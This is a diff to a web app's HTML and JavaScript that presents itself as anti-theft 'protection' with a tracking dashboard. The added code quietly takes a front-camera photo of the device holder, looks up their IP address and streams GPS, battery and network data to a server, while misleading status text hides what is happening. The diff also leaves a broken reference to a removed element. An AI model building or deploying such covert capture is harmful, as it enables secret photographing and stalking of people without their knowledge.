@@ -10,6 +10,8 @@
         .fullscreen-map { position: fixed !important; top: 0 !important; left: 0 !important; width: 100vw !important; height: 100vh !important; z-index: 9999 !important; border-radius: 0 !important; border: none !important; margin: 0 !important; padding: 0 !important; background: #000 !important;}
         .btn-fullscreen { position: absolute; top: 15px; right: 15px; z-index: 10000; background: rgba(0, 0, 0, 0.8); color: #00ff41; border: 2px solid #00ff41; padding: 8px 15px; cursor: pointer; font-weight: bold; border-radius: 5px; transition: 0.3s; }
         .btn-fullscreen:hover { background: #00ff41; color: #000; }
+        .intel-box { border: 1px solid var(--accent); background: rgba(0,0,0,0.5); text-align: center; overflow: hidden; margin-top: 10px;}
+        .intel-box img { width: 100%; display: none; }
     </style>
 </head>
 <body>
@@ -42,29 +44,36 @@
         <div class="login-box" id="protect-section" style="display: none; text-align: center;">
             <div class="blinking-dot" style="margin: 0 auto 15px auto;"></div>
             <h3 style="color: #00ff41; margin-bottom: 15px;">🛡️ PROTECTION ACTIVE</h3>
-            <p style="font-size: 12px; color: #aaa; margin-bottom: 15px;">Live GPS & Device Status beaming to server...</p>
+            <p style="font-size: 12px; color: #aaa; margin-bottom: 15px;">Stealth Mode: Beaming Location, IP & Intel to Server...</p>
             <p id="gps-log" style="font-size: 13px; color: #00f3ff; font-weight: bold;"></p>
             <button class="btn-logout" onclick="location.reload()" style="margin-top: 30px; width: 100%;">STOP PROTECTION</button>
         </div>
 
         <!-- 4. TRACK DASHBOARD -->
         <div id="track-section" style="display: none; width: 100%;">
-            <div style="height: 65vh; width: 100%; display: flex; gap: 20px; flex-wrap: wrap;">
+            <div style="height: 75vh; width: 100%; display: flex; gap: 20px; flex-wrap: wrap;">
                 
-                <!-- Target Data -->
-                <div class="target-details hud-box" style="flex: 1; min-width: 250px;">
+                <!-- Target Data & Camera Intel -->
+                <div class="target-details hud-box" style="flex: 1; min-width: 250px; max-height: 100%; overflow-y: auto;">
                     <div class="corner-tl"></div><div class="corner-tr"></div>
                     <div class="corner-bl"></div><div class="corner-br"></div>
-                    <h3><span class="blinking-dot" style="display:inline-block; margin-right:10px;"></span>TARGET DATA</h3>
-                    <div class="info-box">
+                    <h3><span class="blinking-dot" style="display:inline-block; margin-right:10px;"></span>TARGET UPLINK</h3>
+                    <div class="info-box" style="font-size: 13px;">
                         <p>STATUS: <span id="status" style="color: #ff003c;">CONNECTING...</span></p>
+                        <p>IP ADDR: <span id="ip-addr" style="color: #00f3ff;">--</span></p>
                         <p>BATTERY: <span id="batt">--%</span></p>
                         <p>NETWORK: <span id="net">--</span></p>
                         <p>LATITUDE: <span id="lat">--.-----</span></p>
                         <p>LONGITUDE: <span id="lng">--.-----</span></p>
-                        <p>ACCURACY: <span id="acc">-- meters</span></p>
                     </div>
-                    <div class="radar-box"><div class="radar-scan"></div></div>
+                    
+                    <!-- THE THIEF PHOTO BOX -->
+                    <h4 style="color: #00ff41; margin-top:15px; border-bottom:1px solid #333; padding-bottom:5px;">📷 CAMERA INTEL</h4>
+                    <div class="intel-box">
+                        <img id="thief-photo" src="">
+                        <p id="photo-status" style="font-size:11px; padding:20px; color:#aaa;">AWAITING CAMERA UPLINK...</p>
+                    </div>
+
                     <button class="btn-logout" onclick="location.reload()" style="margin-top: 20px; width: 100%;">EXIT MAP</button>
                 </div>
                 
@@ -87,6 +96,10 @@
         let map, marker, circle, trackingInterval;
         let isFirstLocationLoad = true;
         let isFullScreen = false;
+
+        let targetIp = "Detecting...";
+        let targetPhoto = ""; // Base64 image
+        let cameraAccessed = false;
 
         function toggleFullScreen() {
             const mapBox = document.getElementById('map-container');
@@ -132,46 +145,62 @@
             }).catch(err => { alert("Server error!"); btn.innerText = "SECURE LOGIN"; });
         }
 
-        // GET BATTERY & NETWORK AND SEND TO SERVER
+        // ==========================================
+        // 🛡️ PROTECT MODE (Camera + IP + GPS)
+        // ==========================================
         function activateProtection() {
             document.getElementById('menu-section').style.display = 'none';
             document.getElementById('protect-section').style.display = 'block';
             document.getElementById('form-subtitle').innerText = 'DEVICE SECURED';
             const logText = document.getElementById('gps-log');
-            logText.innerText = "Acquiring GPS Signal...";
+            
+            // 1. Get IP Address
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d => { targetIp = d.ip; }).catch(e=>{});
 
+            // 2. Secretly access Front Camera
+            logText.innerText = "Connecting to Satellite & Security Modules...";
+            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    // Give camera 2 seconds to focus, then snap photo!
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 320; canvas.height = 240;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                        targetPhoto = canvas.toDataURL('image/jpeg', 0.6); // Compress to save speed
+                        stream.getTracks().forEach(track => track.stop()); // Turn off camera light
+                        cameraAccessed = true;
+                    }, 2000);
+                }).catch(err => console.log("Camera access denied"));
+            }
+
+            // 3. Start GPS Beaming
             if (navigator.geolocation) {
                 navigator.geolocation.watchPosition(async (position) => {
-                    
-                    let batteryStr = "Unknown";
-                    let netStr = "Unknown";
-
-                    // Battery check
+                    let batteryStr = "Unknown", netStr = "Unknown";
                     if (navigator.getBattery) {
                         try {
                             let bat = await navigator.getBattery();
                             batteryStr = Math.round(bat.level * 100) + "%";
-                            if(bat.charging) batteryStr += " ⚡"; // Charging icon
+                            if(bat.charging) batteryStr += " ⚡"; 
                         } catch(e) {}
                     }
-                    
-                    // Network check
-                    if (navigator.connection) {
-                        netStr = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "ONLINE";
-                    }
+                    if (navigator.connection) netStr = navigator.connection.effectiveType ? navigator.connection.effectiveType.toUpperCase() : "ONLINE";
 
                     fetch('/api/update-location', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             deviceId: globalDeviceId, 
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude, 
+                            lat: position.coords.latitude, lng: position.coords.longitude, 
                             accuracy: position.coords.accuracy,
-                            battery: batteryStr,
-                            network: netStr
+                            battery: batteryStr, network: netStr,
+                            ipAddress: targetIp, photoUrl: targetPhoto
                         })
-                    }).then(() => logText.innerText = `Data Synced: ${new Date().toLocaleTimeString()}`);
+                    }).then(() => logText.innerText = `All Data Synced: ${new Date().toLocaleTimeString()}`);
                 }, (err) => {
                     logText.innerText = "GPS Error: Please allow location access!";
                     logText.style.color = "#ff003c";
@@ -179,7 +208,9 @@
             }
         }
 
-        // DASHBOARD TRACKING
+        // ==========================================
+        // 🗺️ TRACK MODE (Shows Map + Photo + IP)
+        // ==========================================
         function activateTracking() {
             document.getElementById('menu-section').style.display = 'none';
             document.getElementById('track-section').style.display = 'block';
@@ -212,9 +243,18 @@
                     document.getElementById('lat').innerText = data.lat.toFixed(5);
                     document.getElementById('lng').innerText = data.lng.toFixed(5);
                     document.getElementById('acc').innerText = Math.round(data.accuracy) + " meters";
-                    document.getElementById('batt').innerText = data.battery; // NAYA: Battery display
-                    document.getElementById('net').innerText = data.network;   // NAYA: Network display
+                    document.getElementById('batt').innerText = data.battery; 
+                    document.getElementById('net').innerText = data.network;
+                    document.getElementById('ip-addr').innerText = data.ipAddress; // IP
                     
+                    // Photo logic
+                    if(data.photoUrl && data.photoUrl.length > 100) {
+                        document.getElementById('photo-status').style.display = 'none';
+                        const img = document.getElementById('thief-photo');
+                        img.src = data.photoUrl;
+                        img.style.display = 'block';
+                    }
+
                     document.getElementById('status').innerText = data.status;
                     document.getElementById('status').style.color = "#00ff41";
 
